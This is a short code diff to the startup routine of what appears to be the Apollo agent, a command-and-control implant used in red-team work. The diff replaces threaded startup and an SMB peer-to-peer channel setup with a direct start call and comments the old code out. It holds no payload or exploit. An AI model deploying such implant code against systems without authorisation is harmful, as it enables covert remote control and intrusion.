@@ -20,25 +20,22 @@ namespace Apollo
         static void Main(string[] args)
         {
             Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
-            Thread t = new Thread(ap.Start);
-            t.Start();
-            ApolloInterop.Structs.MythicStructs.C2ProfileData d = new ApolloInterop.Structs.MythicStructs.C2ProfileData()
-            {
-                Name = "smb",
-                IsP2P = true,
-                Parameters = Config.EgressProfiles["smb"].Parameters
-            };
-            d.Parameters["hostname"] = ".";
-            SMBPeer p = new SMBPeer(ap, d);
-            p.Start();
-            while (p.Connected())
-            {
-                Thread.Sleep(1000);
-            }
-            while(ap.IsAlive())
-            {
-                System.Threading.Thread.Sleep(1000);
-            }
+            ap.Start();
+            //Thread t = new Thread(ap.Start);
+            //t.Start();
+            //ApolloInterop.Structs.MythicStructs.C2ProfileData d = new ApolloInterop.Structs.MythicStructs.C2ProfileData()
+            //{
+            //    Name = "smb",
+            //    IsP2P = true,
+            //    Parameters = Config.EgressProfiles["smb"].Parameters
+            //};
+            //d.Parameters["hostname"] = ".";
+            //SMBPeer p = new SMBPeer(ap, d);
+            //p.Start();
+            //while (p.Connected())
+            //{
+            //    Thread.Sleep(1000);
+            //}
         }
     }
 
